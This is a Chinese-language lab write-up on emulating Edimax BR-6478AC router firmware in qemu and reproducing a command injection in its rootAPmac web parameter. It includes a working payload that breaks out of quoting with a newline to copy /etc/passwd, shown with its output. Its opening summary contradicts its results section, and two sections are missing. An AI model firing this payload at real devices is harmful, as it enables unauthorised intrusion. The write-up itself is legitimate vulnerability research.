# 把固件在 qemu 里真正跑起来（Edimax BR-6478AC 实录）

> 目标：`fwmap dyn` 能不能在真实固件上跑出结论。
> 结论：**能跑起来、能发请求、能判状态**；这一轮没打通漏洞分支，
> 但把「起机」这一段的坑全部踩平了，下次直接从第 6 节接着做。

---

## 1. 环境

| 项 | 值 |
|---|---|
| 虚拟机 | VMware，Ubuntu 22.04，4 核 / 7 GB，NAT |
| 模拟器 | `qemu-user-static`（自带 `qemu-mipsel-static`，且已注册 binfmt_misc） |
| 目标 | Edimax BR-6478AC v1.23 的 `bin/webs`（Boa 0.94.14rc21，MIPS **LSB**） |
| 调用方式 | `chroot <rootfs> /bin/webs`（不是 `qemu-mipsel-static -L`） |

## 2. 六个必须踩的坑

### ① 字节序：LSB 的 MIPS 要用 `qemu-mipsel`，不是 `qemu-mips`

用错时 qemu **静默 exit 1**，不打印任何东西——看起来像「服务起不来」。
判据在 ELF 头 `e_ident[EI_DATA]`（1 = 小端）。

`fwmap dyn` 已经按这个区分 `mipsel/mips`、`armel/armeb`。

### ② 文件缺执行位也会静默 exit 1

```bash
sudo chmod -R a+rx root/bin root/sbin
```

### ③ `-L` 不够，必须 chroot

`qemu -L` 只重定向**加载器和共享库**，不重定向程序自己打开的绝对路径。
webs 要 `chdir("/etc/boa")`、读 `/dev/mtdblock0`，`-L` 模式下这些还是宿主机的路径：

```
Could not chdir to "/etc/boa": aborting
```

所以要么 `chroot`，要么把整个 rootfs 当根。**binfmt_misc 已注册时，
`chroot <rootfs> /bin/webs` 直接就能跑**（内核自动调 `mipsel-binfmt-P`）。

### ④ `/etc` 是空的，要从 `etc.tmp` 铺一遍

这台固件的出厂配置放在 `etc.tmp/`，开机时由 init 拷到 `etc/`。
没有 init，就得手工：

```bash
sudo cp -a root/etc.tmp/. root/etc/
```

### ⑤ `/dev` 要自己补

```bash
sudo mknod -m 666 root/dev/null c 1 3
```

### ⑥ **NVRAM：`/dev/mtdblock0` 里要有 hw setting 头**

这一条是最关键的。没有它启动日志是：

```
Read hw setting header failed!, Offset=0
Initialize AP MIB failed!
boa: starting server pid=..., port 80
```

服务**看起来起来了**，但 MIB 是空的，之后**任何**请求都会 SIGSEGV——
包括 `GET /` 和不存在的路径。

解法：固件自带的 `/etc/config.bin` 开头就是 `HS02`（hw setting 头），
把它当成 MTD 分区喂进去：

```bash
for b in 0 3 6 7; do
  sudo cp root/etc/config.bin root/dev/mtdblock$b
  sudo chmod 666 root/dev/mtdblock$b
done
```

之后启动日志干净了，只剩三行版本信息，`GET /` 不再崩。

```
[*] 目标 webs · 架构 mipsel · 运行时 chroot+qemu-mipsel
    对照组（无害 GET /）… no-crash
```

如果对照组崩了，`dyn` 会把所有结果标成 `环境崩溃·未验证`，退出码 3。

## 5. 打通了：命令注入复现

环境健康之后，重放 `/goform/formStaDrvSetup`，抓到了 `system()` 真的被调用：

```
execve("/bin/sh", ["sh", "-c", "echo 'AAAA' > /tmp/apcli0_rootMA"...]) = -1 ENOEXEC
execve("/bin/sh", ["sh", "-c", "/bin/rootAPmac.sh apcli0"])          = -1 ENOEXEC
execve("/bin/sh", ["sh", "-c", "/bin/reboot.sh 3 &"])                = -1 ENOEXEC
```

`ENOEXEC` 指向一个新问题：**解包出来的 `/bin/sh` 是 0 字节文件**。
原因是 squashfs 里的符号链接在 Windows 上解包时变成了空文件
（`/bin/sh -> busybox` 丢了）。在 Linux 里重新 `unsquashfs` 就正常了：

```
lrwxrwxrwx  bin/sh -> busybox
```

重铺 rootfs 后，命令注入一次成功：

```
=== 基线 ===
rootAPmac=AAAA                       执行=否
=== 注入 ===
x'<NL>cp /etc/passwd /tmp/pwned<NL>' 执行=是
   root:x:0:0:root:/root:/bin/sh
   dnrd:x:1:1:dnrd:/:/bin/sh
   ...
```

**VERDICT: CONFIRMED 命令注入**
（对应 CVE-2026-10127，Edimax BR-6478AC v1.23，`rootAPmac` 参数）

### 为什么是这种写法

反编译里这段是：

```c
puVar10 = "echo '%s' > /tmp/apcli0_rootMAC";
sprintf(acStack_340, puVar10, pcVar9);
...
while (*pcVar14 != ';') pcVar14++;   /* 遇到分号就截断 */
*pcVar14 = '\0';
```

两个约束决定了载荷形态：

| 约束 | 后果 | 对策 |
|---|---|---|
| 值被**单引号**包住 | `;id;` 只是普通字符 | 用 `'` 闭合引号 |
| 值在**第一个 `;` 处被截断** | 所有用分号的经典载荷都失效 | 改用**换行** `%0A` 或 `&` |

最终载荷：`x'\ncp /etc/passwd /tmp/pwned\n'`

## 6. 下次接着做（换固件照抄）

1. **解包一定要在 Linux 上做**（`unsquashfs`），Windows 解出来的符号链接全是 0 字节文件；
2. `chmod -R a+rx` 不是可选项——没有执行位 qemu 会静默 exit 1；
3. `cp -a etc.tmp/. etc/`，`mknod dev/null`，`config.bin` → `/dev/mtdblockN`；
4. 先跑对照组，健康了再打载荷；
5. 载荷注意固件对参数的处理：单引号包裹就用 `'` 闭合，分号被截断就用换行 `%0A`。

## 7. 一句话总结

**没有对照组的那一版，会把「缺 NVRAM 导致的必崩」写成「命令注入验证成功」。**
先把环境跑健康，再谈漏洞——这是这次最大的收获。

而这一轮真正打通，靠的是三层接力：
**静态链**（告诉去打哪个函数、哪个参数）→ **反编译**（告诉为什么经典载荷不行）
→ **动态执行**（验证命令真的执行了）。
